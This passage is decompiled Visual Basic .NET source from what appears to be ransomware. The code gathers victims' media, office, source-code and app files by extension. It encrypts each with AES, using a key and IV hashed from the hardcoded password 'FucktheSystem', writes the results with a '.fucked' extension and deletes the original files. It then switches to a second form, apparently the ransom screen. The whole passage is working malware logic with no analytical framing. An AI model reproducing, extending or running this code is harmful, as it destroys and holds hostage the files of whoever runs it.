									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".3gp") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".wmv") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".MOV") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".mp3") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".wav") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".flac") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".wma") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".mov") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".raw") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".doc") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".apk") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".encrypt") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith("crypted") Then
									Me.ListBox8.Items.Add(text)
								ElseIf text.EndsWith(".ahok") Then
									Me.ListBox8.Items.Add(text)
								Else
									If text.EndsWith(".cs") Then
										Me.ListBox8.Items.Add(text)
									End If
									If text.EndsWith(".vb") Then
										Me.ListBox8.Items.Add(text)
									ElseIf text.EndsWith(".ppt") Then
										Me.ListBox8.Items.Add(text)
									ElseIf text.EndsWith(".pptx") Then
										Me.ListBox8.Items.Add(text)
									ElseIf text.EndsWith(".docx") Then
										Me.ListBox8.Items.Add(text)
									ElseIf text.EndsWith(".xlsx") Then
										Me.ListBox8.Items.Add(text)
									End If
								End If
							End If
						Next
					Finally
						Dim enumerator As IEnumerator(Of String)
						If enumerator IsNot Nothing Then
							enumerator.Dispose()
						End If
					End Try
				Catch ex As Exception
				End Try
				Me.ProgressBar7.Increment(1)
			End If
		End Sub

		' Token: 0x06000020 RID: 32 RVA: 0x000059B8 File Offset: 0x00003BB8
		Private Sub Timer8_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar9.Maximum = Me.ListBox8.Items.Count
			If Me.ProgressBar9.Value = Me.ListBox8.Items.Count Then
				Me.Timer1.[Stop]()
				MyProject.Forms.Form2.Show()
				MyBase.Hide()
			Else
				Me.ListBox8.SelectedIndex = Me.ProgressBar9.Value
				Me.ListBox8.SelectionMode = SelectionMode.One
				Me.filenamez = Conversions.ToString(Me.ListBox8.SelectedItem)
				Try
					Dim array As Byte() = Me.CreateKey("FucktheSystem")
					Dim array2 As Byte() = Me.CreateIV("FucktheSystem")
					Me.EncryptOrDecryptFile(Me.filenamez, Me.filenamez + ".fucked", array, array2, Form1.CryptoAction.ActionEncrypt)
				Catch ex As Exception
				End Try
				Me.ProgressBar9.Increment(1)
			End If
		End Sub

		' Token: 0x06000021 RID: 33 RVA: 0x00005AC0 File Offset: 0x00003CC0
		Public Function CreateKey(strPassword As String) As Byte()
			Dim array As Char() = strPassword.ToCharArray()
			Dim upperBound As Integer = array.GetUpperBound(0)
			Dim array2 As Byte() = New Byte(upperBound + 1 - 1) {}
			Dim upperBound2 As Integer = array.GetUpperBound(0)
			For i As Integer = 0 To upperBound2
				array2(i) = CByte(Strings.Asc(array(i)))
			Next
			Dim sha512Managed As SHA512Managed = New SHA512Managed()
			Dim array3 As Byte() = sha512Managed.ComputeHash(array2)
			Dim array4 As Byte() = New Byte(31) {}
			Dim num As Integer = 0
			Do
				array4(num) = array3(num)
				num += 1
			Loop While num <= 31
			Return array4
		End Function

		' Token: 0x06000022 RID: 34 RVA: 0x00005B44 File Offset: 0x00003D44
		Public Function CreateIV(strPassword As String) As Byte()
			Dim array As Char() = strPassword.ToCharArray()
			Dim upperBound As Integer = array.GetUpperBound(0)
			Dim array2 As Byte() = New Byte(upperBound + 1 - 1) {}
			Dim upperBound2 As Integer = array.GetUpperBound(0)
			For i As Integer = 0 To upperBound2
				array2(i) = CByte(Strings.Asc(array(i)))
			Next
			Dim sha512Managed As SHA512Managed = New SHA512Managed()
			Dim array3 As Byte() = sha512Managed.ComputeHash(array2)
			Dim array4 As Byte() = New Byte(15) {}
			Dim num As Integer = 32
			Do
				array4(num - 32) = array3(num)
				num += 1
			Loop While num <= 47
			Return array4
		End Function

		' Token: 0x06000023 RID: 35 RVA: 0x00005BCC File Offset: 0x00003DCC
		Public Sub EncryptOrDecryptFile(strInputFile As String, strOutputFile As String, bytKey As Byte(), bytIV As Byte(), Direction As Form1.CryptoAction)
			' The following expression was wrapped in a checked-statement
			Try
				Me.fsInput = New FileStream(strInputFile, FileMode.Open, FileAccess.Read)
				Me.fsOutput = New FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write)
				Me.fsOutput.SetLength(0L)
				Dim array As Byte() = New Byte(4096) {}
				Dim num As Long = 0L
				Dim length As Long = Me.fsInput.Length
				Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
				Me.ProgressBar10.Value = 0
				Me.ProgressBar10.Maximum = 100
				Dim cryptoStream As CryptoStream
				If Direction <> Form1.CryptoAction.ActionEncrypt Then
					If Direction = Form1.CryptoAction.ActionDecrypt Then
						cryptoStream = New CryptoStream(Me.fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write)
					End If
				Else
					cryptoStream = New CryptoStream(Me.fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write)
				End If
				While num < length
					Dim num2 As Integer = Me.fsInput.Read(array, 0, 4096)
					cryptoStream.Write(array, 0, num2)
					num += CLng(num2)
					Me.ProgressBar10.Value = CInt(Math.Round(CDbl(num) / CDbl(length) * 100.0))
				End While
				cryptoStream.Close()
				Me.fsInput.Close()
				Me.fsOutput.Close()
				If Direction = Form1.CryptoAction.ActionEncrypt Then
					Dim fileInfo As FileInfo = New FileInfo(Me.strFileToEncrypt)
					fileInfo.Delete()
				End If
				If Direction = Form1.CryptoAction.ActionDecrypt Then
					Dim fileInfo2 As FileInfo = New FileInfo(Me.strFileToDecrypt)
					fileInfo2.Delete()
				End If
				Dim text As String = vbCrLf
				If Direction = Form1.CryptoAction.ActionEncrypt Then
					Interaction.MsgBox(String.Concat(New String() { "Encryption Complete", text, text, "Total bytes processed = ", num.ToString() }), MsgBoxStyle.Information, "Done")
				Else
					Interaction.MsgBox(String.Concat(New String() { "Decryption Complete", text, text, "Total bytes processed = ", num.ToString() }), MsgBoxStyle.Information, "Done")
				End If
			Catch obj As Exception When Information.Err().Number = 53
				Interaction.MsgBox("Please check to make sure the path and filenameare correct and if the file exists.", MsgBoxStyle.Exclamation, "Invalid Path or Filename")
			Catch ex As Exception
				Me.fsInput.Close()
				Me.fsOutput.Close()
				If Direction = Form1.CryptoAction.ActionDecrypt Then
					Dim fileInfo3 As FileInfo = New FileInfo(Me.filenamez)
					fileInfo3.Delete()
				Else
					Dim fileInfo4 As FileInfo = New FileInfo(Me.filenamez)
					fileInfo4.Delete()
				End If
			End Try
		End Sub

		' Token: 0x1700000B RID: 11
		' (get) Token: 0x06000026 RID: 38 RVA: 0x0000212C File Offset: 0x0000032C
		' (set) Token: 0x06000027 RID: 39 RVA: 0x00002134 File Offset: 0x00000334
		Friend Overridable Property Label1 As Label

		' Token: 0x1700000C RID: 12
		' (get) Token: 0x06000028 RID: 40 RVA: 0x0000213D File Offset: 0x0000033D
		' (set) Token: 0x06000029 RID: 41 RVA: 0x00002145 File Offset: 0x00000345
		Friend Overridable Property PictureBox1 As PictureBox

		' Token: 0x1700000D RID: 13
		' (get) Token: 0x0600002A RID: 42 RVA: 0x0000214E File Offset: 0x0000034E
		' (set) Token: 0x0600002B RID: 43 RVA: 0x000069F0 File Offset: 0x00004BF0
		Friend Overridable Property Timer8 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer8
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer8_Tick
				Dim timer As Timer = Me._Timer8
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer8 = value
				timer = Me._Timer8
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700000E RID: 14
		' (get) Token: 0x0600002C RID: 44 RVA: 0x00002156 File Offset: 0x00000356
		' (set) Token: 0x0600002D RID: 45 RVA: 0x00006A34 File Offset: 0x00004C34
		Friend Overridable Property Timer7 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer7
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer7_Tick
				Dim timer As Timer = Me._Timer7
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer7 = value
				timer = Me._Timer7
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700000F RID: 15
		' (get) Token: 0x0600002E RID: 46 RVA: 0x0000215E File Offset: 0x0000035E
		' (set) Token: 0x0600002F RID: 47 RVA: 0x00006A78 File Offset: 0x00004C78
		Friend Overridable Property Timer6 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer6
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer6_Tick
				Dim timer As Timer = Me._Timer6
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer6 = value
				timer = Me._Timer6
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000010 RID: 16
		' (get) Token: 0x06000030 RID: 48 RVA: 0x00002166 File Offset: 0x00000366
		' (set) Token: 0x06000031 RID: 49 RVA: 0x00006ABC File Offset: 0x00004CBC
		Friend Overridable Property Timer5 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer5
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer5_Tick
				Dim timer As Timer = Me._Timer5
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer5 = value
				timer = Me._Timer5
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000011 RID: 17
		' (get) Token: 0x06000032 RID: 50 RVA: 0x0000216E File Offset: 0x0000036E
		' (set) Token: 0x06000033 RID: 51 RVA: 0x00006B00 File Offset: 0x00004D00
		Friend Overridable Property Timer4 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer4_Tick
				Dim timer As Timer = Me._Timer4
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer4 = value
				timer = Me._Timer4
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000012 RID: 18
		' (get) Token: 0x06000034 RID: 52 RVA: 0x00002176 File Offset: 0x00000376
		' (set) Token: 0x06000035 RID: 53 RVA: 0x00006B44 File Offset: 0x00004D44
		Friend Overridable Property Timer3 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer3_Tick
				Dim timer As Timer = Me._Timer3
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer3 = value
				timer = Me._Timer3
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000013 RID: 19
		' (get) Token: 0x06000036 RID: 54 RVA: 0x0000217E File Offset: 0x0000037E
		' (set) Token: 0x06000037 RID: 55 RVA: 0x00006B88 File Offset: 0x00004D88
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000014 RID: 20
		' (get) Token: 0x06000038 RID: 56 RVA: 0x00002186 File Offset: 0x00000386
		' (set) Token: 0x06000039 RID: 57 RVA: 0x00006BCC File Offset: 0x00004DCC
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000015 RID: 21
		' (get) Token: 0x0600003A RID: 58 RVA: 0x0000218E File Offset: 0x0000038E
		' (set) Token: 0x0600003B RID: 59 RVA: 0x00002196 File Offset: 0x00000396
		Friend Overridable Property Label2 As Label

		' Token: 0x17000016 RID: 22
		' (get) Token: 0x0600003C RID: 60 RVA: 0x0000219F File Offset: 0x0000039F
		' (set) Token: 0x0600003D RID: 61 RVA: 0x000021A7 File Offset: 0x000003A7
		Friend Overridable Property ProgressBar10 As ProgressBar

		' Token: 0x17000017 RID: 23
		' (get) Token: 0x0600003E RID: 62 RVA: 0x000021B0 File Offset: 0x000003B0
		' (set) Token: 0x0600003F RID: 63 RVA: 0x000021B8 File Offset: 0x000003B8
		Friend Overridable Property ProgressBar9 As ProgressBar

		' Token: 0x17000018 RID: 24
		' (get) Token: 0x06000040 RID: 64 RVA: 0x000021C1 File Offset: 0x000003C1
		' (set) Token: 0x06000041 RID: 65 RVA: 0x000021C9 File Offset: 0x000003C9
		Friend Overridable Property ProgressBar8 As ProgressBar

		' Token: 0x17000019 RID: 25
		' (get) Token: 0x06000042 RID: 66 RVA: 0x000021D2 File Offset: 0x000003D2
		' (set) Token: 0x06000043 RID: 67 RVA: 0x000021DA File Offset: 0x000003DA
		Friend Overridable Property ProgressBar7 As ProgressBar

		' Token: 0x1700001A RID: 26
		' (get) Token: 0x06000044 RID: 68 RVA: 0x000021E3 File Offset: 0x000003E3
		' (set) Token: 0x06000045 RID: 69 RVA: 0x000021EB File Offset: 0x000003EB
		Friend Overridable Property ProgressBar6 As ProgressBar

		' Token: 0x1700001B RID: 27
		' (get) Token: 0x06000046 RID: 70 RVA: 0x000021F4 File Offset: 0x000003F4
		' (set) Token: 0x06000047 RID: 71 RVA: 0x000021FC File Offset: 0x000003FC
		Friend Overridable Property ProgressBar5 As ProgressBar

		' Token: 0x1700001C RID: 28
		' (get) Token: 0x06000048 RID: 72 RVA: 0x00002205 File Offset: 0x00000405
		' (set) Token: 0x06000049 RID: 73 RVA: 0x0000220D File Offset: 0x0000040D
		Friend Overridable Property ProgressBar4 As ProgressBar

		' Token: 0x1700001D RID: 29
		' (get) Token: 0x0600004A RID: 74 RVA: 0x00002216 File Offset: 0x00000416
		' (set) Token: 0x0600004B RID: 75 RVA: 0x0000221E File Offset: 0x0000041E
		Friend Overridable Property ProgressBar3 As ProgressBar

		' Token: 0x1700001E RID: 30
		' (get) Token: 0x0600004C RID: 76 RVA: 0x00002227 File Offset: 0x00000427
		' (set) Token: 0x0600004D RID: 77 RVA: 0x0000222F File Offset: 0x0000042F
		Friend Overridable Property ProgressBar2 As ProgressBar

		' Token: 0x1700001F RID: 31
		' (get) Token: 0x0600004E RID: 78 RVA: 0x00002238 File Offset: 0x00000438
		' (set) Token: 0x0600004F RID: 79 RVA: 0x00002240 File Offset: 0x00000440
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x17000020 RID: 32
		' (get) Token: 0x06000050 RID: 80 RVA: 0x00002249 File Offset: 0x00000449
		' (set) Token: 0x06000051 RID: 81 RVA: 0x00002251 File Offset: 0x00000451
		Friend Overridable Property ListBox9 As ListBox

		' Token: 0x17000021 RID: 33
		' (get) Token: 0x06000052 RID: 82 RVA: 0x0000225A File Offset: 0x0000045A
		' (set) Token: 0x06000053 RID: 83 RVA: 0x00002262 File Offset: 0x00000462
		Friend Overridable Property ListBox8 As ListBox

		' Token: 0x17000022 RID: 34
		' (get) Token: 0x06000054 RID: 84 RVA: 0x0000226B File Offset: 0x0000046B
		' (set) Token: 0x06000055 RID: 85 RVA: 0x00002273 File Offset: 0x00000473
		Friend Overridable Property ListBox7 As ListBox

		' Token: 0x17000023 RID: 35
		' (get) Token: 0x06000056 RID: 86 RVA: 0x0000227C File Offset: 0x0000047C
		' (set) Token: 0x06000057 RID: 87 RVA: 0x00002284 File Offset: 0x00000484
		Friend Overridable Property ListBox6 As ListBox

		' Token: 0x17000024 RID: 36
		' (get) Token: 0x06000058 RID: 88 RVA: 0x0000228D File Offset: 0x0000048D
		' (set) Token: 0x06000059 RID: 89 RVA: 0x00002295 File Offset: 0x00000495
		Friend Overridable Property ListBox5 As ListBox

		' Token: 0x17000025 RID: 37
		' (get) Token: 0x0600005A RID: 90 RVA: 0x0000229E File Offset: 0x0000049E
		' (set) Token: 0x0600005B RID: 91 RVA: 0x000022A6 File Offset: 0x000004A6
		Friend Overridable Property ListBox4 As ListBox

		' Token: 0x17000026 RID: 38
		' (get) Token: 0x0600005C RID: 92 RVA: 0x000022AF File Offset: 0x000004AF
		' (set) Token: 0x0600005D RID: 93 RVA: 0x000022B7 File Offset: 0x000004B7
		Friend Overridable Property ListBox3 As ListBox

		' Token: 0x17000027 RID: 39
		' (get) Token: 0x0600005E RID: 94 RVA: 0x000022C0 File Offset: 0x000004C0
		' (set) Token: 0x0600005F RID: 95 RVA: 0x000022C8 File Offset: 0x000004C8
		Friend Overridable Property ListBox2 As ListBox

		' Token: 0x17000028 RID: 40
		' (get) Token: 0x06000060 RID: 96 RVA: 0x000022D1 File Offset: 0x000004D1
		' (set) Token: 0x06000061 RID: 97 RVA: 0x000022D9 File Offset: 0x000004D9
		Friend Overridable Property ListBox1 As ListBox

		' Token: 0x0400000B RID: 11
		Private filenamez As String

		' Token: 0x0400000C RID: 12
		Private strFileToEncrypt As String

		' Token: 0x0400000D RID: 13
		Private strFileToDecrypt As String

		' Token: 0x0400000E RID: 14
		Private strOutputEncrypt As String

		' Token: 0x0400000F RID: 15
		Private strOutputDecrypt As String

		' Token: 0x04000010 RID: 16
		Private fsInput As FileStream

		' Token: 0x04000011 RID: 17
		Private fsOutput As FileStream

		' Token: 0x0200000E RID: 14
		Public Enum CryptoAction
			' Token: 0x04000068 RID: 104
			ActionEncrypt = 1
			' Token: 0x04000069 RID: 105
			ActionDecrypt
		End Enum
	End Class
End Namespace
